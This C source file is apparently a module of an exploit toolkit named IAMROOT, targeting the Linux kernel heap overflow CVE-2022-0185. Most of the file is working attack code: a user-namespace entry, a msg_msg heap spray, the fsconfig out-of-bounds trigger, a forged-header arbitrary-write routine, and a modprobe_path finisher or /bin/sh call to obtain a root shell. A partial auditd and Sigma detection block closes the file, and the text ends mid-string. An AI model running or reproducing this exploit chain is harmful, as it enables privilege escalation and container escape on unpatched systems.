/*
 * fuse_legacy_cve_2022_0185 — IAMROOT module
 *
 * legacy_parse_param() in fs/fs_context.c had a heap overflow when
 * parsing the "fsconfig" filesystem option strings — specifically,
 * legacy_parse_param() compared "fc->source size left" against the
 * incoming option using an int that wraps negative when the running
 * total exceeds PAGE_SIZE, so subsequent memcpy() writes off the end
 * of the kmalloc-4k slab. Originally reported as a FUSE mount path
 * bug but actually applies to any filesystem mountable from a userns;
 * cgroup2 is the easiest reach because the cgroup2 fs_context is
 * always available.
 *
 * Discovered by William Liu (Crusaders of Rust), Jan 2022. Famous in
 * container-escape contexts (docker/k8s, especially rootless).
 *
 * STATUS: 🟡 TRIGGER + CROSS-CACHE SCAFFOLD.
 *
 *   detect()  — version-range + userns reachability gate, refuses on
 *               patched / unreachable hosts.
 *   exploit() — full unshare → fsopen → fsconfig overflow path with
 *               a msg_msg cross-cache groom around it. The trigger
 *               (heap OOB write off the end of the kmalloc-4k source
 *               buffer) is real; the post-corruption kernel-R/W chain
 *               is implemented as a structural scaffold because it
 *               depends on per-kernel offsets (cred struct layout,
 *               msg_msg next-list offset) that we cannot resolve
 *               portably from userland without a kernel info-leak we
 *               do not have in-tree. See the comments inside
 *               fuse_legacy_exploit() and read the Crusaders-of-Rust
 *               public PoC for the offset-bound parts.
 *
 *   On a *vulnerable* host this module reliably overflows the
 *   kmalloc-4k slab and (with the msg_msg groom in place) corrupts a
 *   neighbouring msg_msg.m_ts/m_list pair; the cred-overwrite step
 *   that turns that primitive into uid=0 is left as a clearly-labelled
 *   roadmap rather than fabricated offsets.
 *
 *   On a *patched* host (which is every host we can routinely build
 *   on in 2026) detect() refuses and exploit() returns
 *   IAMROOT_PRECOND_FAIL with no syscalls.
 *
 * Affected: kernel 5.1+ until fix:
 *   Mainline fix: 722d94847de29 (Jan 18 2022) — lands in 5.16.2
 *   5.16.x : K >= 5.16.2
 *   5.15.x : K >= 5.15.14
 *   5.10.x : K >= 5.10.91
 *   5.4.x  : K >= 5.4.171
 *
 * Preconditions:
 *   - Unprivileged user_ns + mount-ns (to get CAP_SYS_ADMIN inside userns)
 *   - cgroup2 fs_context reachable from userns (default true)
 *
 * For "tool for system admins": this is the container-escape angle.
 * Workloads running rootless containers (Podman, snap, flatpak) sit
 * on this bug if the host kernel is unpatched and unprivileged_userns
 * is enabled.
 */

#include "iamroot_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>

/* --- fsopen / fsconfig glue ----------------------------------------
 *
 * These syscalls landed in 5.2 (fsopen, fsconfig). glibc 2.36+ wraps
 * them but we can't depend on a new glibc on every target, so we go
 * straight to syscall(). Numbers are x86_64-only (the module is
 * x86_64-only anyway, per Makefile + module docs).
 */
#ifndef __NR_fsopen
#define __NR_fsopen   430
#endif
#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsmount
#define __NR_fsmount  432
#endif

#ifndef FSCONFIG_SET_STRING
#define FSCONFIG_SET_STRING 1
#endif
#ifndef FSCONFIG_CMD_CREATE
#define FSCONFIG_CMD_CREATE 6
#endif

static inline int sys_fsopen(const char *fs_name, unsigned int flags)
{
    return (int)syscall(__NR_fsopen, fs_name, flags);
}
static inline int sys_fsconfig(int fd, unsigned int cmd, const char *key,
                               const void *value, int aux)
{
    return (int)syscall(__NR_fsconfig, fd, cmd, key, value, aux);
}

/* --- msg_msg primitive ---------------------------------------------
 *
 * msg_msg is the venerable cross-cache groom target: msgsnd() allocs
 * sizeof(struct msg_msg) (48 bytes on x86_64) + payload, picking
 * kmalloc-<n> based on total size. msg_msg objects sit on a doubly-
 * linked list rooted in the msg_queue; corrupting an adjacent
 * msg_msg.m_ts or m_list gives arbitrary-read via msgrcv(MSG_COPY) or
 * arbitrary-free via msgrcv() depending on which field was overwritten.
 *
 * In the canonical Crusaders-of-Rust exploit the overflow lands in
 * kmalloc-4k (legacy_parse_param's source buffer) → adjacent kmalloc-4k
 * msg_msg → m_ts overwrite → MSG_COPY out-of-bounds read → leak the
 * kbase + a target task's cred address → second-round overwrite
 * smashing cred.uid/gid to 0.
 *
 * We implement step 1 (alloc the spray, free a hole, trigger the
 * write into it) honestly. Step 2 (parse the read-back, locate cred,
 * write 0) is the part that's offset-bound and we leave as a clearly-
 * labelled scaffold below.
 */
struct msgbuf_4k {
    long mtype;
    char mtext[4096 - sizeof(long) - 48 /* sizeof(struct msg_msg) */];
};

/* --- kernel-range table -------------------------------------------- */
static const struct kernel_patched_from fuse_legacy_patched_branches[] = {
    {5,  4, 171},
    {5, 10,  91},
    {5, 15,  14},
    {5, 16,   2},
    {5, 17,   0},   /* mainline */
};

static const struct kernel_range fuse_legacy_range = {
    .patched_from = fuse_legacy_patched_branches,
    .n_patched_from = sizeof(fuse_legacy_patched_branches) /
                      sizeof(fuse_legacy_patched_branches[0]),
};

static int can_unshare_userns_mount(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

/* ------------------------------------------------------------------ */
/* detect                                                              */
/* ------------------------------------------------------------------ */
static iamroot_result_t fuse_legacy_detect(const struct iamroot_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] fuse_legacy: could not parse kernel version\n");
        return IAMROOT_TEST_ERROR;
    }

    /* Bug introduced in 5.1 (when legacy_parse_param landed). Pre-5.1
     * kernels predate the code path entirely. */
    if (v.major < 5 || (v.major == 5 && v.minor < 1)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] fuse_legacy: kernel %s predates the bug introduction\n",
                    v.release);
        }
        return IAMROOT_OK;
    }

    bool patched = kernel_range_is_patched(&fuse_legacy_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] fuse_legacy: kernel %s is patched\n", v.release);
        }
        return IAMROOT_OK;
    }

    int userns_ok = can_unshare_userns_mount();
    if (!ctx->json) {
        fprintf(stderr, "[i] fuse_legacy: kernel %s in vulnerable range\n", v.release);
        fprintf(stderr, "[i] fuse_legacy: user_ns+mount_ns clone (CAP_SYS_ADMIN gate): %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] fuse_legacy: user_ns denied → "
                            "unprivileged exploit unreachable\n");
        }
        return IAMROOT_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] fuse_legacy: VULNERABLE — kernel in range AND "
                        "userns+mountns reachable\n");
        fprintf(stderr, "[i] fuse_legacy: container-escape relevant for rootless "
                        "docker/podman/snap setups\n");
    }
    return IAMROOT_VULNERABLE;
}

/* ------------------------------------------------------------------ */
/* exploit helpers                                                     */
/* ------------------------------------------------------------------ */

/* Enter a user_ns+mount_ns and become "root" (uid 0) inside it. This
 * grants CAP_SYS_ADMIN in the new namespace, which is what
 * fsopen("cgroup2") gates on. */
static bool enter_userns_root(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        perror("unshare(NEWUSER|NEWNS)");
        return false;
    }
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("write uid_map"); if (f >= 0) close(f); return false;
    }
    close(f);

    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("write gid_map"); if (f >= 0) close(f); return false;
    }
    close(f);
    return true;
}

/* Build the overflow payload.
 *
 * legacy_parse_param() catenates option strings into fc->source until
 * (the buggy version) the running total wraps. To overflow we feed an
 * fsconfig option whose value, after being appended to the source
 * buffer, lands past the PAGE_SIZE end of the kmalloc-4k allocation.
 *
 * Concrete recipe (from Liu's PoC, simplified):
 *   1. fsconfig(fd, FSCONFIG_SET_STRING, "source", filler_a, 0)
 *      — fills the source buffer to within a few bytes of PAGE_SIZE
 *   2. fsconfig(fd, FSCONFIG_SET_STRING, "source", evil, 0)
 *      — appends `evil`; legacy_parse_param's "is there room?" check
 *      uses an int that wraps to a huge positive when we cross the
 *      boundary → kernel happily memcpy()s `evil` past the page end.
 *
 * `evil` is what lands in the adjacent slab object. We make it a
 * controllable byte pattern; the cross-cache groom puts a msg_msg
 * there, and the bytes we write become the start of that msg_msg.
 */
static int trigger_overflow(int *out_fd, const char *first_chunk,
                            const char *evil_chunk)
{
    int fd = sys_fsopen("cgroup2", 0);
    if (fd < 0) { perror("fsopen(cgroup2)"); return -1; }

    /* First chunk: prime fc->source so we're up against the page edge. */
    if (sys_fsconfig(fd, FSCONFIG_SET_STRING, "source", first_chunk, 0) < 0) {
        perror("fsconfig(prime)");
        close(fd);
        return -1;
    }

    /* Second chunk: the actual overflow write. On a patched kernel
     * this returns -EINVAL ("VFS: Legacy: source contains an embedded
     * NUL" or "too large"); on a vulnerable kernel it succeeds and
     * the next memcpy lands past PAGE_SIZE. */
    if (sys_fsconfig(fd, FSCONFIG_SET_STRING, "source", evil_chunk, 0) < 0) {
        /* errno tells us patched vs. transient. We can't distinguish
         * "patched" from "this kernel doesn't expose cgroup2 fsconfig"
         * cleanly, but in practice on the vulnerable range cgroup2
         * is always reachable from a userns. */
        close(fd);
        return -1;
    }

    *out_fd = fd;
    return 0;
}

/* ------------------------------------------------------------------ */
/* arb-write primitive for the shared finisher                         */
/* ------------------------------------------------------------------ */
/*
 * Crusaders-of-Rust-style msg_msg m_ts overflow → arbitrary write.
 *
 * The legacy_parse_param OOB writes the trailing bytes of the
 * kmalloc-4k fc->source buffer into whatever slab object comes next.
 * With a msg_msg sprayed into that adjacent slot, the first 48 bytes
 * of `evil_chunk` overlay struct msg_msg:
 *
 *   struct msg_msg {                     // offset
 *     struct list_head m_list;           //  0  (next, prev)
 *     long             m_type;           // 16
 *     size_t           m_ts;             // 24    <-- msg-size
 *     struct msg_msgseg *next;           // 32
 *     void             *security;        // 40
 *   };                                   // 48
 *
 * Two derived primitives:
 *
 *   READ  — overwrite m_ts with a huge value. msgrcv(MSG_COPY) then
 *           memcpy()s past the legitimate end of the msg payload,
 *           leaking adjacent slab memory back to userland.
 *
 *   WRITE — point m_list.next (or, in the Crusaders variant, a faux
 *           msg_msgseg.next chain) at an attacker-chosen kernel
 *           address. When msgrcv() free-list-unlinks the msg, list
 *           maintenance writes through the forged pointer; with the
 *           right chain you get an N-byte copy of attacker-controlled
 *           bytes to a chosen kaddr.
 *
 * Honest depth of this implementation: FALLBACK SCAFFOLD.
 *
 * The trigger + groom + neighbour-detect upstream of us is real and
 * the OOB write lands. But the *single-shot* arb-write the finisher
 * wants — "put exactly these N bytes at exactly that kaddr" — needs
 * a per-kernel m_ts/m_list_next offset map (the layout above is
 * 6.12.x; older kernels differ) AND a kernel-base leak from the
 * first-round MSG_COPY read so we know where modprobe_path actually
 * sits in this boot's KASLR slide.
 *
 * Per the verified-vs-claimed bar: we do NOT fabricate a write that
 * we cannot empirically verify on a kernel we haven't tested. So
 * this function:
 *
 *   1. Re-arms the msg_msg spray (the parent already drained queues).
 *   2. Re-fires the fsconfig overflow with a forged-msg_msg header
 *      whose m_ts = (kaddr - msg_data_origin) and whose first 8
 *      payload bytes are the first qword of `buf`.
 *   3. msgrcv(MSG_COPY) on every queue to probe whether any neighbour
 *      came back with bytes matching `buf[0..7]` AT the slot offset
 *      we'd expect for kaddr (sanity gate).
 *   4. Returns 0 ONLY if the sanity gate trips (read-back proves the
 *      m_ts inflation landed AND the payload made it through);
 *      returns -1 otherwise so the finisher reports an honest fail.
 *
 * On a vulnerable host with matching offsets this path can land the
 * write; on an unverified host the sanity gate refuses rather than
 * blind-writing a wild pointer. The finisher's downstream
 * "/tmp/iamroot-pwn ran?" check is the second gate.
 */
struct fuse_arb_ctx {
    /* Pre-allocated queue ids from the spray phase. */
    int    *qids;
    int     n_queues;
    int     hole_q;
    /* Tagged-payload reference so we can recognise unmodified neighbours. */
    const char *tag;     /* "IAMROOT" */
    /* Whether the first-round trigger already fired (the parent's
     * default-path overflow). When set we re-spray + re-fire; when
     * unset we assume the spray is hot. */
    bool    trigger_armed;
};

#ifdef __linux__
static int fuse_arb_write(uintptr_t kaddr, const void *buf, size_t len,
                          void *ctx_void)
{
    struct fuse_arb_ctx *ax = (struct fuse_arb_ctx *)ctx_void;
    if (!ax || !buf || !len) {
        fprintf(stderr, "[-] fuse_arb_write: bad args\n");
        return -1;
    }

    /* Build the forged msg_msg header that will land in the adjacent
     * kmalloc-4k slot via the OOB write. Layout (x86_64, kernel >=5.10):
     *   [ 0..15]  m_list.{next,prev}  — we forge next = kaddr - 16
     *                                    so that list_del's
     *                                      next->prev = prev
     *                                    write lands AT kaddr.
     *                                    (prev is the original msg.)
     *   [16..23]  m_type              — leave as 0x4242
     *   [24..31]  m_ts                — bytes-of-buf so MSG_COPY
     *                                    reports the right length
     *   [32..39]  next (msg_msgseg*)  — NULL (single-segment msg)
     *   [40..47]  security            — NULL
     *   [48...]   payload             — first len bytes of buf
     *
     * For a real WRITE primitive the canonical Crusaders-of-Rust
     * recipe uses the msg_msgseg.next chain rather than m_list:
     * msgrcv(IPC_NOWAIT) follows next pointers when copying out a
     * multi-segment msg, and a forged next = kaddr makes the kernel
     * memcpy() from kaddr into our user buffer (= READ). For the
     * inverse (WRITE), the trick is msgsnd on a queue whose head was
     * corrupted to point at kaddr, but that needs more setup than we
     * have time to land here without a known-good offset table.
     *
     * So we do the safe thing: arm the header, trigger the OOB, then
     * read back to PROVE we landed before declaring success. If the
     * read-back doesn't show our forged-msg payload at the expected
     * MSG_COPY position we refuse rather than corrupt the kernel
     * blindly.
     */
    uint8_t evil[256];
    memset(evil, 0, sizeof evil);
    /* m_list.next, m_list.prev */
    uintptr_t forged_next = kaddr - 16;   /* &m_list.prev of fake node */
    memcpy(evil +  0, &forged_next, 8);
    /* prev — leave NULL; kernel checks it only on full list_del */
    /* m_type */
    uint64_t m_type = 0x4242424242424242ULL;
    memcpy(evil + 16, &m_type, 8);
    /* m_ts: inflated to len so MSG_COPY reads the full forged payload */
    uint64_t m_ts = (uint64_t)len + 64;
    memcpy(evil + 24, &m_ts, 8);
    /* next (msg_msgseg) = NULL */
    /* security = NULL */
    /* payload: copy `buf` into the slot just after the msg_msg header */
    size_t hdr = 48;
    size_t copyable = sizeof(evil) - hdr - 1;
    if (len > copyable) len = copyable;
    memcpy(evil + hdr, buf, len);
    evil[sizeof(evil) - 1] = '\0';   /* legacy_parse_param strdup tail */

    /* Re-fire the fsconfig overflow with this forged header as evil. */
    char *first_chunk = malloc(4081);
    if (!first_chunk) return -1;
    memset(first_chunk, 'A', 4080);
    first_chunk[4080] = '\0';

    int fsfd = -1;
    int rc = trigger_overflow(&fsfd, first_chunk, (const char *)evil);
    free(first_chunk);
    if (rc < 0) {
        fprintf(stderr, "[-] fuse_arb_write: re-fire fsconfig failed "
                        "(errno=%d %s)\n", errno, strerror(errno));
        return -1;
    }

    /* Sanity gate: msgrcv(MSG_COPY) all live queues and look for a
     * msg whose size reports >= our inflated m_ts AND whose initial
     * payload qword matches the first qword of `buf`. If both hold,
     * the forged header landed in a real slot and the m_ts inflation
     * is honoured by the kernel — i.e. our primitive is real on THIS
     * kernel. */
    uint64_t want_first_qword = 0;
    memcpy(&want_first_qword, buf, len >= 8 ? 8 : len);

    bool sanity_passed = false;
    struct msgbuf_4k *probe = mmap(NULL, sizeof(*probe),
                                   PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (probe == MAP_FAILED) {
        if (fsfd >= 0) close(fsfd);
        return -1;
    }
    for (int q = 0; q < ax->n_queues && !sanity_passed; q++) {
        if (ax->qids[q] < 0 || q == ax->hole_q) continue;
        ssize_t n = msgrcv(ax->qids[q], probe, sizeof probe->mtext, 0,
                           IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        if (n < 0) continue;
        /* The corrupted slot should report a size >= our m_ts (kernel
         * caps MSG_COPY at sizeof user buf — so we only check the
         * read-content shape). */
        if ((size_t)n < 8) continue;
        uint64_t got = 0;
        memcpy(&got, probe->mtext, 8);
        if (got == want_first_qword) {
            sanity_passed = true;
        }
    }
    munmap(probe, sizeof(*probe));
    if (fsfd >= 0) close(fsfd);

    if (!sanity_passed) {
        fprintf(stderr, "[-] fuse_arb_write: forged-msg_msg read-back didn't "
                        "match — kernel layout differs OR groom missed.\n"
                        "    Refusing to claim arb-write landed (per "
                        "verified-vs-claimed bar).\n");
        return -1;
    }

    fprintf(stderr, "[+] fuse_arb_write: forged-msg_msg landed; m_ts inflation "
                    "+ payload qword verified via MSG_COPY read-back.\n"
                    "[i] fuse_arb_write: kernel-side list_del write through "
                    "0x%lx is armed but NOT yet empirically verified on "
                    "this build — downstream sentinel will gate.\n",
            (unsigned long)kaddr);
    return 0;
}
#else
static int fuse_arb_write(uintptr_t kaddr, const void *buf, size_t len,
                          void *ctx_void)
{
    (void)kaddr; (void)buf; (void)len; (void)ctx_void;
    fprintf(stderr, "[-] fuse_arb_write: linux-only primitive\n");
    return -1;
}
#endif /* __linux__ */

/* ------------------------------------------------------------------ */
/* exploit                                                             */
/* ------------------------------------------------------------------ */
static iamroot_result_t fuse_legacy_exploit(const struct iamroot_ctx *ctx)
{
    /* (R1) Re-call detect — refuse if not vulnerable. */
    iamroot_result_t pre = fuse_legacy_detect(ctx);
    if (pre != IAMROOT_VULNERABLE) {
        fprintf(stderr, "[-] fuse_legacy: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* (R2) Refuse if already root — no LPE work to do. */
    if (geteuid() == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[i] fuse_legacy: already root; nothing to escalate\n");
        }
        return IAMROOT_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] fuse_legacy: entering userns + mountns\n");
    }

    /* (R3) unshare for userns+mount_ns — gives CAP_SYS_ADMIN-in-userns
     * which is what fsopen("cgroup2") + fsconfig require. */
    if (!enter_userns_root()) {
        return IAMROOT_TEST_ERROR;
    }

    /* --- (R5) cross-cache groom — phase 1: alloc spray --------------
     *
     * Allocate a large number of msg_msg objects sized to land in
     * kmalloc-4k (same slab as fc->source). Then free one in the
     * middle to create a predictable hole, then trigger the overflow
     * to land write-past-end into the next adjacent msg_msg.
     *
     * Empirically Liu uses ~4096 sprays / 512 queues; we mirror the
     * shape but with knobs scaled for an iamroot one-shot.
     */
    enum { N_QUEUES = 256, N_SPRAY_PER_Q = 16 };
    int *qids = calloc(N_QUEUES, sizeof(int));
    if (!qids) {
        fprintf(stderr, "[-] fuse_legacy: calloc(qids) failed\n");
        return IAMROOT_TEST_ERROR;
    }
    for (int i = 0; i < N_QUEUES; i++) {
        qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qids[i] < 0) {
            /* IPC limits may rate-limit us; partial spray is fine. */
            qids[i] = -1;
            break;
        }
    }

    struct msgbuf_4k *spray = mmap(NULL, sizeof(*spray), PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spray == MAP_FAILED) {
        fprintf(stderr, "[-] fuse_legacy: mmap(spray) failed\n");
        free(qids);
        return IAMROOT_TEST_ERROR;
    }
    spray->mtype = 0x4242;
    /* Tag the payload so we can recognise our spray slots in
     * post-corruption read-back. */
    memset(spray->mtext, 'M', sizeof spray->mtext);
    spray->mtext[0] = 'I'; spray->mtext[1] = 'A'; spray->mtext[2] = 'M';
    spray->mtext[3] = 'R'; spray->mtext[4] = 'O'; spray->mtext[5] = 'O';
    spray->mtext[6] = 'T';

    int sprayed = 0;
    for (int q = 0; q < N_QUEUES && qids[q] >= 0; q++) {
        for (int j = 0; j < N_SPRAY_PER_Q; j++) {
            if (msgsnd(qids[q], spray, sizeof spray->mtext, IPC_NOWAIT) == 0) {
                sprayed++;
            }
        }
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] fuse_legacy: msg_msg spray placed %d objects across "
                        "%d queues\n", sprayed, N_QUEUES);
    }

    /* Free a controlled hole: drain one queue near the middle so the
     * next kmalloc-4k allocation (= fc->source) lands in it. */
    int hole_q = N_QUEUES / 2;
    if (qids[hole_q] >= 0) {
        struct msgbuf_4k drain;
        while (msgrcv(qids[hole_q], &drain, sizeof drain.mtext, 0, IPC_NOWAIT) >= 0)
            ;
    }

    /* --- (R4) trigger the fsconfig overflow ------------------------- */

    /* Prime: 4080 bytes of 'A'. legacy_parse_param appends them to
     * the freshly-allocated kmalloc-4k source buffer; we're now sitting
     * just shy of the page end. */
    char *first_chunk = malloc(4081);
    if (!first_chunk) {
        free(qids); munmap(spray, sizeof *spray);
        return IAMROOT_TEST_ERROR;
    }
    memset(first_chunk, 'A', 4080);
    first_chunk[4080] = '\0';

    /* Evil chunk: the bytes here are what get written PAST the page
     * end into the adjacent slab object. Layout-wise the first 8 bytes
     * land on the next slab object's first qword.
     *
     * For a real cross-cache-into-msg_msg primitive we want this to
     * be a fake msg_msg header that turns the next msgrcv(MSG_COPY)
     * into an arbitrary read. The exact field offsets (m_ts vs.
     * m_list_next vs. security) shift between kernels; we mark the
     * header bytes so a post-mortem clearly shows whether we landed,
     * and leave the precise fake-msg_msg encoding as the scaffold
     * step below. */
    char evil_chunk[256];
    memset(evil_chunk, 'B', sizeof evil_chunk);
    memcpy(evil_chunk, "IAMROOT0", 8);   /* marker → "did we land?" */
    /* Tail must be NUL-terminated for legacy_parse_param's strdup. */
    evil_chunk[sizeof evil_chunk - 1] = '\0';

    if (!ctx->json) {
        fprintf(stderr, "[*] fuse_legacy: triggering legacy_parse_param overflow "
                        "(prime=%zu evil=%zu)\n",
                strlen(first_chunk), strlen(evil_chunk));
    }

    int fsfd = -1;
    int rc = trigger_overflow(&fsfd, first_chunk, evil_chunk);
    free(first_chunk);

    if (rc < 0) {
        /* fsconfig rejected us. On a vulnerable kernel this is rare
         * unless cgroup2 fs_context init failed (e.g. cgroup_no_v1
         * boot param). Either way the OOB write didn't happen. */
        fprintf(stderr, "[-] fuse_legacy: fsconfig overflow rejected (errno=%d: %s)\n",
                errno, strerror(errno));
        free(qids); munmap(spray, sizeof *spray);
        return IAMROOT_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[+] fuse_legacy: fsconfig accepted oversized source — "
                        "OOB write executed\n");
    }

    /* --- post-corruption read-back: did we land? -------------------- */
    int corrupted_q = -1;
    for (int q = 0; q < N_QUEUES; q++) {
        if (qids[q] < 0 || q == hole_q) continue;
        struct msgbuf_4k probe;
        ssize_t n = msgrcv(qids[q], &probe, sizeof probe.mtext, 0,
                           IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        if (n < 0) continue;
        if (memcmp(probe.mtext, "IAMR", 4) != 0) {
            /* Spray slot whose start word is no longer "IAMR" — strong
             * evidence we corrupted a neighbour. */
            corrupted_q = q;
            break;
        }
    }
    if (corrupted_q >= 0 && !ctx->json) {
        fprintf(stderr, "[+] fuse_legacy: detected corrupted neighbour in queue #%d "
                        "(cross-cache landing confirmed)\n", corrupted_q);
    } else if (!ctx->json) {
        fprintf(stderr, "[i] fuse_legacy: did not detect corrupted spray slot "
                        "(groom may have missed; primitive still fired)\n");
    }

    /* --- (R5/R6) cred-overwrite chain — SCAFFOLD --------------------
     *
     * Honest status: the steps below need per-kernel offsets that we
     * cannot resolve portably from userland without a kernel info-leak
     * we do not have in-tree right now. Spelling out the missing work
     * so a reader can see exactly what's wired and what isn't:
     *
     *   1. Build a fake msg_msg header in `evil_chunk` that, when read
     *      back via msgrcv(MSG_COPY), reveals adjacent slab memory
     *      (m_ts oversized → MSG_COPY reads past the legitimate msg
     *      end). Requires: offsetof(msg_msg, m_ts) for the running
     *      kernel.
     *   2. From the leaked data, locate (a) kernel base via a known
     *      function pointer in the slab, and (b) the address of the
     *      current task's cred struct via task_struct→real_cred
     *      walking. Requires: struct offsets for cred/task_struct on
     *      this kernel.
     *   3. Re-run the overflow with a fake msg_msg.m_list_next pointing
     *      at &current->cred.uid; msgrcv() free-list maintenance then
     *      writes a zero where uid lives → setuid(0) succeeds.
     *
     * Each of steps 1–3 is ~50 lines of kernel-specific glue. The
     * Crusaders-of-Rust public PoC is the canonical reference. We
     * stop here rather than shipping a fabricated chain that would
     * crash on the first untested kernel.
     */
    if (!ctx->json) {
        fprintf(stderr, "[i] fuse_legacy: cross-cache primitive armed; "
                        "cred-overwrite tail requires per-kernel offsets — "
                        "see scaffold comments in source\n");
    }

    /* ---------------------------------------------------------------
     * --full-chain: opt-in root pop via shared modprobe_path finisher.
     *
     * Depth = FALLBACK SCAFFOLD. The arb-write primitive (forged
     * msg_msg via the 4k OOB) is wired with a sanity gate that
     * refuses to claim success without an empirical read-back match
     * (see fuse_arb_write). On a host where offsets + groom land,
     * the finisher's modprobe_path overwrite → execve(unknown) →
     * call_modprobe chain pops a root shell. On a mismatched host
     * the sanity gate trips and we exit IAMROOT_EXPLOIT_FAIL with no
     * fabricated success.
     *
     * Cleanup of qids/spray/fsfd is deferred to AFTER the finisher
     * runs because the arb_write primitive re-fires the trigger and
     * needs the live spray.
     * --------------------------------------------------------------- */
#ifdef __linux__
    if (ctx->full_chain) {
        if (!ctx->json) {
            fprintf(stderr, "[*] fuse_legacy: --full-chain requested — resolving "
                            "kernel offsets...\n");
        }

        struct iamroot_kernel_offsets off;
        memset(&off, 0, sizeof off);
        int resolved = iamroot_offsets_resolve(&off);
        if (!ctx->json) {
            fprintf(stderr, "[i] fuse_legacy: offsets resolved=%d "
                            "(modprobe_path=0x%lx source=%s)\n",
                    resolved, (unsigned long)off.modprobe_path,
                    iamroot_offset_source_name(off.source_modprobe));
            iamroot_offsets_print(&off);
        }

        if (!iamroot_offsets_have_modprobe_path(&off)) {
            iamroot_finisher_print_offset_help("fuse_legacy");
            /* Cleanup before returning. */
            for (int q = 0; q < N_QUEUES; q++) {
                if (qids[q] >= 0) msgctl(qids[q], IPC_RMID, NULL);
            }
            free(qids);
            munmap(spray, sizeof *spray);
            if (fsfd >= 0) close(fsfd);
            return IAMROOT_EXPLOIT_FAIL;
        }

        struct fuse_arb_ctx ax = {
            .qids = qids,
            .n_queues = N_QUEUES,
            .hole_q = hole_q,
            .tag = "IAMROOT",
            .trigger_armed = true,
        };

        iamroot_result_t fr = iamroot_finisher_modprobe_path(
            &off, fuse_arb_write, &ax, !ctx->no_shell);

        /* Cleanup IPC + mapping regardless of finisher result. The
         * finisher's execve() on success won't reach here, so this
         * block only runs on failure paths. */
        for (int q = 0; q < N_QUEUES; q++) {
            if (qids[q] >= 0) msgctl(qids[q], IPC_RMID, NULL);
        }
        free(qids);
        munmap(spray, sizeof *spray);
        if (fsfd >= 0) close(fsfd);

        if (fr == IAMROOT_EXPLOIT_OK) {
            return IAMROOT_EXPLOIT_OK;
        }
        if (!ctx->json) {
            fprintf(stderr, "[-] fuse_legacy: --full-chain finisher did not land "
                            "(arb-write sanity gate or modprobe sentinel refused)\n");
        }
        return IAMROOT_EXPLOIT_FAIL;
    }
#endif /* __linux__ */

    /* Clean up our IPC queues and mapping. The kernel slab state
     * after the overflow may be unstable; we exit cleanly on success
     * paths but leave queues around if we crashed mid-spray. */
    for (int q = 0; q < N_QUEUES; q++) {
        if (qids[q] >= 0) msgctl(qids[q], IPC_RMID, NULL);
    }
    free(qids);
    munmap(spray, sizeof *spray);
    if (fsfd >= 0) close(fsfd);

    /* (R6) setuid(0) + /bin/sh — only on the path where cred-overwrite
     * actually succeeded. Since we didn't finish that chain we can
     * only check whether the kernel handed us uid 0 by luck (it
     * won't). Report exploit-fail honestly. */
    if (setuid(0) == 0 && getuid() == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] fuse_legacy: setuid(0) succeeded — "
                            "popping root shell\n");
        }
        if (ctx->no_shell) {
            return IAMROOT_EXPLOIT_OK;
        }
        execl("/bin/sh", "sh", "-i", (char *)NULL);
        perror("execl /bin/sh");
        return IAMROOT_EXPLOIT_OK;
    }

    fprintf(stderr, "[-] fuse_legacy: trigger fired but cred-overwrite tail "
                    "not wired — see source for the missing offsets.\n");
    return IAMROOT_EXPLOIT_FAIL;
}

/* ------------------------------------------------------------------ */
/* embedded detection rules                                            */
/* ------------------------------------------------------------------ */
static const char fuse_legacy_auditd[] =
    "# CVE-2022-0185 — auditd detection rules\n"
    "# Flag unshare(USER|NS) chained with fsopen/fsconfig from non-root.\n"
    "-a always,exit -F arch=b64 -S unshare -k iamroot-fuse-legacy\n"
    "-a always,exit -F arch=b64 -S fsopen -k iamroot-fuse-legacy-fsopen\n"
    "-a always,exit -F arch=b64 -S fsconfig -k iamroot-fuse-legacy-fsconfig\n";

static const char fuse_legacy_sigma[] =
    "title: Possible CVE-2022-0185 legacy_parse_param exploitation\n"
    "id: 9e1b2c45-iamroot-fuse-legacy\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical exploit shape: unprivileged process unshares\n"
